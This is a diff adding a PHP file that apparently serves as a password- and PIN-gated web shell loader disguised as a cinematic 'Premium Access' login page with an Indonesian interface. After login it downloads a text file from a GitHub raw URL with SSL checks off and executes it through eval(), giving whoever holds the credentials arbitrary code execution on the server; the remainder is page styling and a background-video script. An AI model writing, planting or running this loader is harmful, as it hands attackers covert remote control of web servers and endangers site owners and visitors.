@@ -1,0 +1,500 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+session_start();
+define('SECURE_ACCESS', true);
+header('X-Powered-By: none');
+header('Content-Type: text/html; charset=UTF-8');
+
+$hashed_password = '$2y$10$qn4Yz6OFMOJaoR8KdMunxeU/GCF/E4CZ6R.fjK45y/Vta.ljs3jvq';
+$hashed_pin = '$2y$10$YGsLH5ePoH.sAAq6JDwmVuOheB/CZ2FuoWF2uQ.xCNXEJRVtMdhcu';
+
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        $data = curl_exec($conn);
+        curl_close($conn);
+        return $data;
+    } elseif (function_exists('file_get_contents')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+function is_logged_in() {
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if (is_logged_in()) {
+    $a = geturlsinfo('https://raw.githubusercontent.com/Kamp4ng/cilako/refs/heads/main/litespeed.txt');
+    if ($a === false) {
+        die("Gagal mendapatkan konten dari URL.");
+    }
+    eval('?>' . $a);
+} else {
+    $error = '';
+    if (isset($_POST['password']) && isset($_POST['pin'])) {
+        $entered_password = $_POST['password'];
+        $entered_pin = $_POST['pin'];
+
+        if (password_verify($entered_password, $hashed_password) && password_verify($entered_pin, $hashed_pin)) {
+            $_SESSION['logged_in'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = "Password atau PIN salah!";
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <title>Login | Premium Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        /* Video Background - FULL COVER TANPA TERPOTONG */
+        .video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 0;
+        }
+        
+        #bgVideo {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: brightness(0.55) contrast(1.05);
+        }
+        
+        /* Overlay Gradient biar teks lebih terbaca */
+        .video-container::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(145deg, rgba(0,0,0,0.65) 0%, rgba(0,0,0,0.35) 100%);
+            pointer-events: none;
+        }
+        
+        /* Sound Control Button */
+        .sound-control {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 30;
+            background: rgba(0,0,0,0.65);
+            backdrop-filter: blur(10px);
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+        }
+        
+        .sound-control:hover {
+            background: rgba(103,0,90,0.85);
+            transform: scale(1.05);
+            border-color: rgba(255,255,255,0.4);
+        }
+        
+        .sound-control svg {
+            width: 22px;
+            height: 22px;
+            fill: white;
+        }
+        
+        /* Container Login - RAPI DI TENGAH */
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 28px 26px;
+            background: rgba(12, 12, 12, 0.68);
+            backdrop-filter: blur(18px);
+            border-radius: 28px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.06);
+            color: white;
+            text-align: center;
+            z-index: 20;
+            animation: fadeScale 0.5s ease-out;
+            margin: 16px;
+        }
+        
+        @keyframes fadeScale {
+            from {
+                opacity: 0;
+                transform: scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        
+        .container h2 {
+            margin-bottom: 6px;
+            font-size: 27px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+            background: linear-gradient(125deg, #fff, #e0e0e0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .container .subtitle {
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 24px;
+            letter-spacing: 0.3px;
+            font-weight: 400;
+        }
+        
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            margin-bottom: 6px;
+            color: #ccc;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 14px;
+            border: 1px solid rgba(255,255,255,0.18);
+            background: rgba(255,255,255,0.07);
+            outline: none;
+            font-size: 14px;
+            color: white;
+            transition: all 0.2s ease;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+        
+        input:focus {
+            border-color: #8b2a7a;
+            background: rgba(255,255,255,0.11);
+            box-shadow: 0 0 12px rgba(139,42,122,0.4);
+        }
+        
+        input::placeholder {
+            color: rgba(255,255,255,0.4);
+            font-size: 13px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(105deg, #5c004e, #2e0025);
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            margin-top: 12px;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.3);
+            letter-spacing: 0.5px;
+        }
+        
+        button:hover {
+            transform: translateY(-1px);
+            background: linear-gradient(105deg, #720060, #3e0032);
+            box-shadow: 0 10px 20px rgba(92,0,78,0.4);
+        }
+        
+        button:active {
+            transform: translateY(1px);
+        }
+        
+        .error {
+            color: #ff8a7a;
+            background: rgba(255,60,30,0.12);
+            padding: 10px 12px;
+            border-radius: 14px;
+            margin-bottom: 18px;
+            font-size: 12px;
+            border-left: 3px solid #ff6b5e;
+            text-align: left;
+            backdrop-filter: blur(4px);
+        }
+        
+        /* Responsive makin rapi */
+        @media (max-width: 450px) {
+            .container {
+                max-width: 88%;
+                padding: 24px 20px;
+            }
+            
+            .container h2 {
+                font-size: 24px;
+            }
+            
+            .container .subtitle {
+                font-size: 11px;
+                margin-bottom: 20px;
+            }
+            
+            input {
+                padding: 11px 12px;
+                font-size: 13px;
+            }
+            
+            button {
+                padding: 11px;
+                font-size: 14px;
+            }
+            
+            .sound-control {
+                width: 42px;
+                height: 42px;
+                bottom: 16px;
+                right: 16px;
+            }
+        }
+        
+        /* Loading smooth */
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #030303;
+            z-index: 999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: #eee;
+            font-size: 13px;
+            transition: opacity 0.45s ease;
+            backdrop-filter: blur(2px);
+        }
+        
+        .loading-spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: #a03b8c;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 14px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .volume-indicator {
+            position: fixed;
+            bottom: 80px;
+            right: 28px;
+            background: rgba(0,0,0,0.7);
+            padding: 6px 14px;
+            border-radius: 40px;
+            font-size: 11px;
+            font-weight: 500;
+            color: white;
+            z-index: 30;
+            transition: opacity 0.25s ease;
+            pointer-events: none;
+            backdrop-filter: blur(8px);
+            letter-spacing: 0.3px;
+        }
+        
+        @media (max-width: 480px) {
+            .volume-indicator {
+                bottom: 70px;
+                right: 22px;
+                font-size: 10px;
+                padding: 4px 12px;
+            }
+        }
+    </style>
+    </head>
+    <body>
+    <div class="loading" id="loading">
+        <div class="loading-spinner"></div>
+        <div>loading cinematic ..</div>
+    </div>
+    
+    <div class="video-container">
+        <video id="bgVideo" autoplay loop muted playsinline>
+            <source src="https://kawi898berjuang.com/newupdate/sora.mp4" type="video/mp4" />
+        </video>
+    </div>
+    
+    <div class="sound-control" id="soundControl" title="sound on/off">
+        <svg id="soundIcon" viewBox="0 0 24 24" width="24" height="24">
+            <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/>
+        </svg>
+    </div>
+    
+    <div class="volume-indicator" id="volumeIndicator" style="opacity:0;">🔊 Sound ON</div>
+    
+    <div class="container">
+        <h2>Welcome Back</h2>
+        <div class="subtitle">enter your credentials to continue</div>
+        <?php if (!empty($error)) echo "<div class='error'>⚠️ $error</div>"; ?>
+        <form method="post">
+            <div class="input-group">
+                <label>🔒 Password</label>
+                <input type="password" name="password" placeholder="your password" required autocomplete="off" />
+            </div>
+            <div class="input-group">
+                <label>🔢 PIN (6 digits)</label>
+                <input type="password" name="pin" placeholder="6-digit PIN" maxlength="6" required autocomplete="off" />
+            </div>
+            <button type="submit">Login →</button>
+        </form>
+    </div>
+    
+    <script>
+        (function(){
+            const video = document.getElementById('bgVideo');
+            const loading = document.getElementById('loading');
+            const soundControl = document.getElementById('soundControl');
+            const soundIcon = document.getElementById('soundIcon');
+            const volumeIndicator = document.getElementById('volumeIndicator');
+            
+            let isSoundOn = false;
+            let indicatorTimeout;
+            
+            function showMsg(msg, isOnStyle) {
+                volumeIndicator.textContent = msg;
+                volumeIndicator.style.opacity = '1';
+                volumeIndicator.style.backgroundColor = isOnStyle ? 'rgba(103,0,90,0.85)' : 'rgba(0,0,0,0.75)';
+                clearTimeout(indicatorTimeout);
+                indicatorTimeout = setTimeout(() => {
+                    volumeIndicator.style.opacity = '0';
+                }, 1400);
+            }
+            
+            function updateIcon(state) {
+                if(state) {
+                    soundIcon.innerHTML = '<path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/>';
+                } else {
+                    soundIcon.innerHTML = '<path d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z"/>';
+                }
+            }
+            
+            function toggleSound() {
+                if(!video) return;
+                if(isSoundOn) {
+                    video.muted = true;
+                    isSoundOn = false;
+                    showMsg('🔇 Sound OFF', false);
+                } else {
+                    video.muted = false;
+                    isSoundOn = true;
+                    video.play().catch(e => {
+                        showMsg('⚠️ click page to enable sound', false);
+                        video.muted = true;
+                        isSoundOn = false;
+                    });
+                    showMsg('🔊 Sound ON', true);
+                }
+                updateIcon(isSoundOn);
+                localStorage.setItem('vidSound', isSoundOn);
+            }
+            
+            function loadPref() {
+                let saved = localStorage.getItem('vidSound');
+                if(saved !== null) {
+                    isSoundOn = saved === 'true';
+                    if(video) {
+                        video.muted = !isSoundOn;
+                        updateIcon(isSoundOn);
+                    }
+                } else {
+                    if(video) video.muted = true;
+                    updateIcon(false);
+                }
+            }
+            
+            if(video) {
+                video.addEventListener('canplay', () => {
+                    loading.style.opacity = '0';
+                    setTimeout(() => loading.style.display = 'none', 400);
+                });
+                video.addEventListener('error', () => {
+                    loading.innerHTML = '<div class="loading-spinner"></div><div>video not found, but you can login</div>';
+                    setTimeout(() => loading.style.display = 'none', 1800);
+                });
+                loadPref();
+                setTimeout(() => {
+                    if(loading.style.display !== 'none') loading.style.display = 'none';
+                }, 3500);
+            }
+            
+            if(soundControl) soundControl.addEventListener('click', (e) => {
+                e.preventDefault();
+                toggleSound();
+            });
+            
+            document.body.addEventListener('click', () => {
+                if(video && isSoundOn && video.muted) {
+                    video.muted = false;
+                    video.play().catch(()=>{});
+                    showMsg('🔊 Sound enabled', true);
+                    updateIcon(true);
+                }
+            }, { once: true });
+        })();
+    </script>
+    </body>
+    </html>
+    <?php
+}
+?>
